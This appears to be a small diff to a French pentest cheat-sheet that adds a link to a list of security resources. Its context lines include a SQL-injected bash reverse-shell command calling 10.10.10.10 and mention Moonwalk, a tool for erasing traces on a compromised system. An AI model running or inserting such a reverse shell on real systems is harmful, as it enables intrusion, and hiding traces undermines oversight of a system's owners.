@@ -41,7 +41,7 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 
 - [Moonwalk](https://github.com/mufeedvh/moonwalk) --> efface les traces après des actions sur un système
 
-- Biblothèque cyber --> https://inventory.raw.pm/tools.html#title-tools-threat-intelligence
+- Biblothèque cyber --> https://inventory.raw.pm/tools.html#title-tools-threat-intelligence + https://johnermac.github.io/
 
 
 ### Payload
